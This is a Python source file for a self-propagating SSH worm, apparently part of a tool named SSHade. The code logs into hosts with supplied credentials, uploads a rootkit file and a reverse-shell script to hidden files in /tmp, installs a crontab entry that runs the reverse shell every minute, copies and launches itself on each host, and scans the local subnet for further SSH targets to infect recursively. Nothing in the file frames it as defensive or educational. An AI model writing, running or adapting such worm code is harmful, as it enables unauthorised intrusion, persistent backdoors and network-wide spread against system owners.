#!/usr/bin/env python3
import paramiko
import socket
import subprocess
import sys
import os
from scp import SCPClient
import ipaddress
import threading
import time

class SSHWorm:
    def __init__(self):
        # Set of infected IPs to avoid reinfection
        self.infected_ips = set()
        # Lock for thread-safe operations on infected_ips
        self.lock = threading.Lock()
        
    def connect_ssh(self, host, username, password, port=22):
        """Establish SSH connection to a host"""
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(
                host, port=port, username=username, 
                password=password, timeout=10
            )
            return ssh_client
        except Exception as e:
            print(f"[!] Failed to connect to {host}: {e}")
            return None

    def deploy_rootkit(self, ssh_client, host):
        """Deploy the existing rootkit on the target host"""
        try:
            print(f"[*] Deploying rootkit on {host}")
            # Upload rootkit files via SCP
            with SCPClient(ssh_client.get_transport()) as scp:
                # Upload the rootkit binary
                scp.put("payloads/rootkit.c", "/tmp/.rootkit.c")
                scp.put("payloads/reverse_shell.sh", "/tmp/.reverse_shell")
            
            # Compile and execute the rootkit
            commands = [
                "chmod +x /tmp/.reverse_shell",
                "echo '* * * * * /tmp/.reverse_shell' | crontab - 2>/dev/null"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh_client.exec_command(cmd)
                stdout.read()
                stderr.read()
            
            print(f"[+] Rootkit deployed on {host}")
            return True
        except Exception as e:
            print(f"[!] Failed to deploy rootkit on {host}: {e}")
            return False

    def upload_sshade(self, ssh_client, host):
        """Upload a copy of SSHade itself to /tmp"""
        try:
            print(f"[*] Uploading SSHade to {host}")
            with SCPClient(ssh_client.get_transport()) as scp:
                # Upload the main SSHade script
                scp.put("sshade.py", "/tmp/sshade.py")
                # Make it executable
                stdin, stdout, stderr = ssh_client.exec_command("chmod +x /tmp/sshade.py")
                stdout.read()
                stderr.read()
            print(f"[+] SSHade uploaded to {host}")
            return True
        except Exception as e:
            print(f"[!] Failed to upload SSHade to {host}: {e}")
            return False

    def execute_worm(self, ssh_client, host, username, password, max_depth):
        """Remotely execute the uploaded copy with --worm flag"""
        try:
            print(f"[*] Executing worm on {host}")
            # Execute the uploaded copy with --worm flag
            cmd = f"python3 /tmp/sshade.py -t {host} --worm"
            stdin, stdout, stderr = ssh_client.exec_command(cmd)
            # We don't wait for completion as it's a background process
            print(f"[+] Worm executed on {host}")
            return True
        except Exception as e:
            print(f"[!] Failed to execute worm on {host}: {e}")
            return False

    def scan_subnet(self, subnet):
        """Scan the internal subnet for other SSH hosts"""
        try:
            print(f"[*] Scanning subnet {subnet} for SSH hosts")
            network = ipaddress.ip_network(subnet, strict=False)
            ssh_hosts = []
            
            # Simple port scanning for SSH (port 22)
            for ip in network.hosts():
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((str(ip), 22))
                if result == 0:
                    ssh_hosts.append(str(ip))
                sock.close()
                
            print(f"[+] Found {len(ssh_hosts)} SSH hosts in subnet {subnet}")
            return ssh_hosts
        except Exception as e:
            print(f"[!] Failed to scan subnet {subnet}: {e}")
            return []

    def is_infected(self, ip):
        """Check if an IP is already infected"""
        with self.lock:
            return ip in self.infected_ips

    def mark_infected(self, ip):
        """Mark an IP as infected"""
        with self.lock:
            self.infected_ips.add(ip)

    def infect_host(self, host, username, password, max_depth, current_depth=0):
        """Infect a single host and propagate to others"""
        # Check if we've reached maximum depth
        if current_depth >= max_depth:
            print(f"[*] Maximum depth reached, stopping propagation at {host}")
            return
            
        # Check if already infected
        if self.is_infected(host):
            print(f"[*] Host {host} already infected, skipping")
            return
            
        # Mark as infected
        self.mark_infected(host)
        print(f"[*] Attempting to infect {host} (depth: {current_depth})")
        
        # Connect to the host
        ssh_client = self.connect_ssh(host, username, password)
        if not ssh_client:
            return
            
        try:
            # Deploy rootkit
            if not self.deploy_rootkit(ssh_client, host):
                print(f"[!] Failed to deploy rootkit on {host}")
                return
                
            # Upload SSHade
            if not self.upload_sshade(ssh_client, host):
                print(f"[!] Failed to upload SSHade to {host}")
                return
                
            # Execute worm
            if not self.execute_worm(ssh_client, host, username, password, max_depth):
                print(f"[!] Failed to execute worm on {host}")
                return
                
            print(f"[+] Successfully infected {host}")
            
            # Scan subnet for more targets
            # Assuming a common internal network 192.168.0.0/24
            subnet = ".".join(host.split(".")[:3]) + ".0/24"
            targets = self.scan_subnet(subnet)
            
            # Try to infect discovered targets
            for target in targets:
                if target != host and not self.is_infected(target):
                    print(f"[*] Propagating to {target}")
                    self.infect_host(target, username, password, max_depth, current_depth + 1)
                    
        finally:
            ssh_client.close()

    def run(self, seed_host, username, password, max_depth=3):
        """Main worm execution function"""
        print("[*] Starting SSH worm propagation")
        print(f"[*] Seed host: {seed_host}")
        print(f"[*] Max depth: {max_depth}")
        
        # Start infection from seed host
        self.infect_host(seed_host, username, password, max_depth)
        
        print("[*] SSH worm propagation completed")

if __name__ == "__main__":
    # This is for standalone execution
    if len(sys.argv) < 4:
        print("Usage: python3 worm.py <seed_host> <username> <password> [max_depth]")
        sys.exit(1)
        
    seed_host = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    max_depth = int(sys.argv[4]) if len(sys.argv) > 4 else 3
    
    worm = SSHWorm()
    worm.run(seed_host, username, password, max_depth)
